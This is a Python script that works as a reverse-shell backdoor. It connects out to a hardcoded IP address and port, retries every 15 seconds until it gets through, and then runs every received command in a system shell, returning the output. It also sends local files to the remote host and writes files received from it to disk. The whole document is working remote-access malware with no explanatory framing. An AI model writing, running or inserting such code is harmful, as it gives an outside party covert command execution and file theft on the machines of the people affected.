import time
import socket
import subprocess
import json
import signal
import os

ip = '3.64.4.198'
port = 19395

sigint = False

def reliable_send(sock, data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())
    return

def reliable_recv(sock):
    data = ''
    while not sigint:
        try:
            chunk = sock.recv(4096).decode().rstrip()
            data += chunk
            return json.loads(data)
        except:
            continue
    return

def upload_file(sock, filename):
    try:
        with open(filename, 'rb') as f:
            sock.send(f.read())
    except:
        sock.send(bytes('No such file', 'utf-8'))
    return

def download_file(sock, filename):
    
    with open(filename, 'wb') as f:
        sock.settimeout(1)
        chunk = sock.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = sock.recv(1024)
            except:
                break
        sock.settimeout(None)

    return

def shell(sock):
    global sigint
    
    while not sigint:
        result = ''
        command = reliable_recv(sock)
        command_split = command.split(' ')

        if command_split[0] == 'download':
            toupload = ' '.join(command_split[1:])
            if os.path.exists(toupload):
                toreturn = 'Downloading file: ' + str(toupload)
                reliable_send(sock, toreturn)
                upload_file(sock, toupload)
            else:
                toreturn = 'No such file: ' + str(toupload)
                reliable_send(sock, toreturn)
            
            continue

        if command_split[0] == 'quit':
            sigint = True
            break
        elif command_split[0] == 'clear':
            pass
        elif command_split[0] == 'cd':
            tocd = ' '.join(command_split[1:])
            if os.path.exists(tocd):
                os.chdir(tocd)
        elif command_split[0] == 'upload':
            todownload = ' '.join(command_split[1:])
            download_file(sock, todownload)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(sock, result)
    return

def connection(sock):
    while not sigint:
        try:
            sock.connect((ip, port))
            shell(sock)
            return
        except (ConnectionRefusedError):
            time.sleep(15)

def signal_handler(sig, frame):
    global sigint
    print("\nSIGINT detected. Exiting...")
    sigint = True

if __name__ == "__main__":

    signal.signal(signal.SIGINT, signal_handler)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    connection(s)
    s.close()
    print("Socket closed! Exit OK")